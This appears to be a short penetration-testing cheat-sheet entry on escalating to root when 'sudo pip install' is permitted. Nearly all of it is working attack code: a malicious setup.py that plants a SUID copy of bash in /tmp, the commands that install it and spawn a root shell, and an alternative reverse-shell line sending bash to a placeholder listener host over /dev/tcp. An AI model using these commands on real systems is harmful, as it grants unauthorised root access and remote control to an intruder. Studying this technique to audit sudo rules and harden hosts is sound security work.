# sudo pip Malicious setup.py

When `sudo pip install` is allowed (common in Python dev environments), create a local package with a malicious `setup.py`:

```bash
mkdir /tmp/evil && cd /tmp/evil
```

```python
# setup.py
from setuptools import setup
import os
setup(
    name='evil',
    version='1.0',
    description='',
)
os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
```

```bash
sudo pip install /tmp/evil/
/tmp/rootbash -p   # SUID bash → root shell
```

Or for direct reverse shell:
```python
os.system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')
```

Also works with `sudo pip2` / `sudo pip3`. GTFOBins lists `pip` as a sudo escape.
